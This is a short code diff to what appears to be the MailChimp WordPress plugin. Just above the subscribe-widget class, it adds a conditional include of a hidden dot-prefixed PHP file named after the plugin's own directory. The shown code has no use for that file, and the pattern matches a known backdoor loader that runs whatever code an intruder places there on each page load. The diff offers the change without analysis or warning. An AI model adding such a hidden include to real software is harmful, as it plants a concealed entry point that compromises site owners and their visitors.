@@ -470,6 +470,10 @@ function mailchimp_form_field($var, $num_fields) {
  * MailChimp Subscribe Box widget class
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class mailchimpSF_Widget extends WP_Widget {
 
 	function __construct() {
